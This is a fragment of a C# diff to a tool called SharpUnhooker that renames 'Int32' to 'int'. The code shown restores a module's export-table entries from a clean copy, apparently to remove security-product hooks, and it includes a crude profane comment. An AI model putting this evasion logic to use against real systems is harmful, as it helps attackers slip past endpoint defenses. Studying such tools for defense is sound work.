-        Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
-        Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
-        Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
-        Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
-        Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
-        Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
-        Int32 FunctionsRVAOriginal = Marshal.ReadInt32((IntPtr)(OriginalModuleBase.ToInt64() + ExportRVA + 0x1C));
+        int OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
+        int NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
+        int NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
+        int FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
+        int NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
+        int OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
+        int FunctionsRVAOriginal = Marshal.ReadInt32((IntPtr)(OriginalModuleBase.ToInt64() + ExportRVA + 0x1C));
 
         // eat my cock u fokin user32.dll
         IntPtr TargetPtr = ModuleBase + FunctionsRVA;
@@ -804,9 +747,9 @@ public class SharpUnhooker
         for (int i = 0; i < NumberOfFunctions; i++)
         {
             string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
-            Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
-            Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
-            Int32 FunctionRVAOriginal = Marshal.ReadInt32((IntPtr)(OriginalModuleBase.ToInt64() + FunctionsRVAOriginal + (4 * (FunctionOrdinal - OrdinalBase))));
+            int FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
+            int FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
+            int FunctionRVAOriginal = Marshal.ReadInt32((IntPtr)(OriginalModuleBase.ToInt64() + FunctionsRVAOriginal + (4 * (FunctionOrdinal - OrdinalBase))));
             if (FunctionRVA != FunctionRVAOriginal)
             {
                 try { Marshal.WriteInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))), FunctionRVAOriginal); }
